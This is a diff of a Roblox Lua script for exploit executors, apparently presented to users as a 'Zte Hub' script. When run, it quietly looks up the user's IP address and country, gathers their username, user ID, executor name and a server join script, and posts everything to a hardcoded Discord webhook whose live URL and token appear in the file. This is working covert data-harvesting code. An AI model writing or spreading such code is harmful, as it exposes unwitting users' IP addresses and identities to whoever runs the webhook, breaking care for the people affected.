@@ -1,115 +1,105 @@
--- LocalScript: send_info_full.lua
--- Đặt vào StarterPlayerScripts để đảm bảo trả về LocalPlayer
+-- Roblox Lua (to be run inside an exploit executor that supports HTTP)
+local HttpService  = game:GetService("HttpService")
+local WebhookUrl   = "https://discord.com/api/webhooks/1379048133702455396/TmMAJJF_g_04qtJasWYKHI2K0JmX-l01wp_LBGGNCj9wECRli2a3OtIXSW-PSyRgmuHy"
 
-local Http       = game:GetService("HttpService")
-local WebhookUrl = "https://discord.com/api/webhooks/1379048133702455396/TmMAJJF_g_04qtJasWYKHI2K0JmX-l01wp_LBGGNCj9wECRli2a3OtIXSW-PSyRgmuHy" -- Thay thành webhook thật của bạn
-local executor   = identifyexecutor() or "UnknownExecutor"
-
---========================================================================
--- 1. Hàm lấy “Country + IP” từ https://api.myip.com/
---    (HTTPS bắt buộc; nếu bị chặn thì trả về "Unknown")
---========================================================================
-local function getIPInfo()
-    local success, response = pcall(function()
-        return Http:GetAsync("https://api.myip.com/")
-    end)
-    if not success then
-        print("DEBUG | getIPInfo() => HTTP request thất bại hoặc bị chặn")
-        return "Unknown", "Unknown"
-    end
-
-    print("DEBUG | getIPInfo() response JSON: " .. response)
-
-    local ok, decoded = pcall(function()
-        return Http:JSONDecode(response)
-    end)
-    if not ok or type(decoded) ~= "table" then
-        print("DEBUG | JSONDecode failed hoặc data không phải table")
-        return "Unknown", "Unknown"
-    end
-
-    if type(decoded.country) == "string" and type(decoded.ip) == "string" then
-        print("DEBUG | API trả về -> country: " .. decoded.country .. ", ip: " .. decoded.ip)
-        return decoded.country, decoded.ip
-    else
-        print("DEBUG | API JSON thiếu 'country' hoặc 'ip'")
-        return "Unknown", "Unknown"
+-- Try to detect executor; if identifyexecutor() doesn't exist or returns nil, fall back to "UnknownExecutor"
+local executorName = "UnknownExecutor"
+if pcall(function() return identifyexecutor() end) then
+    local detected = identifyexecutor()
+    if type(detected) == "string" and #detected > 0 then
+        executorName = detected
     end
 end
 
---========================================================================
--- 2. Hàm build payload, gom tất cả thông tin (Executor, Country, IP, Game Name, Player Info, Join Script)
---========================================================================
-local function buildPayload()
-    -- Lấy LocalPlayer, nếu nil thì báo là nil
-    local player      = game.Players.LocalPlayer
-    if not player then
-        warn("DEBUG | LocalPlayer đang nil. Hãy đảm bảo đây là LocalScript trong StarterPlayerScripts.")
+-- Fetch IP info (country + ip) from https://api.myip.com/; if anything fails, return "Unknown"
+local function getIPInfo()
+    local ok, response = pcall(function()
+        return HttpService:GetAsync("https://api.myip.com/")
+    end)
+
+    if not ok or typeof(response) ~= "string" then
+        return "Unknown", "Unknown"
     end
 
-    local displayName = player and player.DisplayName or "DisplayName Unknown"
-    local userName    = player and player.Name or "Name Unknown"
-    local playerId    = player and player.UserId or 0
+    local success, data = pcall(function()
+        return HttpService:JSONDecode(response)
+    end)
+    if not success or type(data) ~= "table" or not data.country or not data.ip then
+        return "Unknown", "Unknown"
+    end
 
-    -- Lấy game name
-    local gameName = tostring(game.Name or "UnknownGame")
-    print("DEBUG | buildPayload() lấy gameName: " .. gameName)
+    return data.country, data.ip
+end
 
-    -- Lấy placeId + jobId để build join script
-    local placeId = tostring(game.PlaceId)
-    local jobId   = tostring(game.JobId)
-    local joinScript = "game:GetService('TeleportService'):TeleportToPlaceInstance(" ..
-                        placeId .. ", '" .. jobId .. "', game.Players.LocalPlayer)"
+-- Build the actual Discord‐webhook payload
+local function buildWebhookPayload()
+    -- Local player info
+    local player      = game.Players.LocalPlayer
+    local displayName = (player and player.DisplayName) or "Not Available"
+    local userName    = (player and player.Name)        or "UnknownUser"
+    local playerId    = (player and player.UserId)      or 0
 
-    -- Lấy country + ip
-    local country, ip = getIPInfo()
-    print("DEBUG | buildPayload() -> country: " .. country .. " | ip: " .. ip)
+    -- PlaceId and JobId (to re-join the exact same server instance)
+    local placeId = tostring(game.PlaceId or 0)
+    local jobId   = tostring(game.JobId or "")
 
-    -- Xây embed
-    local embed1 = {
-        author = {
-            name = "Zte hub Server"
+    -- Construct the Roblox teleport snippet; note that jobId is wrapped in single quotes
+    local joinScript = 
+        "game:GetService('TeleportService'):TeleportToPlaceInstance(" ..
+        placeId .. ", '" .. jobId .. "', game.Players.LocalPlayer)"
+
+    -- Fetch country + IP (returns “Unknown” if it fails)
+    local country, ipAddr = getIPInfo()
+
+    -- Build an “embed” that shows executor, country, IP, etc.
+    local embeds = {
+        {
+            author = {
+                name = "Zte Hub Server",
+            },
+            title  = userName .. " | " .. displayName,
+            type   = "rich",
+            color  = tonumber(0x00FF00),
+
+            thumbnail = {
+                url = 
+                  "https://api.newstargeted.com/roblox/users/v1/avatar-headshot?"
+                  .. "userid=" .. playerId .. "&size=720x720&format=Png&isCircular=false"
+            },
+
+            fields = {
+                {
+                    name  = "Executor:",
+                    value = tostring(executorName),
+                    inline = false,
+                },
+                {
+                    name  = "Country:",
+                    value = tostring(country),
+                    inline = false,
+                },
+                {
+                    name  = "IP Address:",
+                    value = tostring(ipAddr),
+                    inline = false,
+                },
+                {
+                    name  = "Game Name:",
+                    value = tostring(game.Name or "Unknown Game"),
+                    inline = false,
+                },
+            },
         },
-        title = userName .. " | " .. displayName,
-        type  = "rich",
-        color = tonumber(0x00FF00),
-        thumbnail = {
-            url = "https://api.newstargeted.com/roblox/users/v1/avatar-headshot?" ..
-                  "userid=" .. playerId .. "&size=720x720&format=Png&isCircular=false"
-        },
-        fields = {
-            {
-                name   = "Executor:",
-                value  = executor,
-                inline = true
-            },
-            {
-                name   = "Country:",
-                value  = country,
-                inline = true
-            },
-            {
-                name   = "IP Address:",
-                value  = ip,
-                inline = true
-            },
-            {
-                name   = "Game Name:",
-                value  = gameName,
-                inline = false
-            },
-        },
-    }
-
-    local embed2 = {
-        title       = "Join Server Script",
-        description = "```lua\n" .. joinScript .. "\n```",
-        color       = tonumber(0x00FF00),
+        {
+            title       = "Join Server Script",
+            description = "```lua\n" .. joinScript .. "\n```",
+            color       = tonumber(0x00FF00),
+        }
     }
 
     local payload = {
         content = "**Thanks for using the script!**",
-        embeds  = { embed1, embed2 }
+        embeds  = embeds,
     }
 
     return {
@@ -118,29 +108,29 @@ local function buildPayload()
         Headers = {
             ["Content-Type"] = "application/json"
         },
-        Body    = Http:JSONEncode(payload)
+        Body    = HttpService:JSONEncode(payload),
     }
 end
 
---========================================================================
--- 3. Gửi webhook: tự động chọn hàm thích hợp
---========================================================================
+-- Send the HTTP request to Discord
 local function sendWebhook()
-    local requestFunc
-    if syn and syn.request then
-        requestFunc = syn.request
-    else
-        requestFunc = http_request or request or HttpPost or (syn and syn.request)
-    end
+    local requestData = buildWebhookPayload()
 
-    if not requestFunc then
-        warn("DEBUG | Không tìm thấy hàm request để gửi HTTP")
+    -- If running under Synapse X (syn.request()), use that:
+    if syn and typeof(syn.request) == "function" then
+        syn.request(requestData)
         return
     end
-    requestFunc(buildPayload())
+
+    -- Otherwise try one of the common fallback names:
+    local fallbackRequester = http_request or request or http.request or HttpPost
+    if typeof(fallbackRequester) == "function" then
+        fallbackRequester(requestData)
+        return
+    end
+
+    warn("No supported HTTP‐request function found! Cannot send webhook.")
 end
 
---========================================================================
--- 4. Thực thi
---========================================================================
+-- Execute
 sendWebhook()
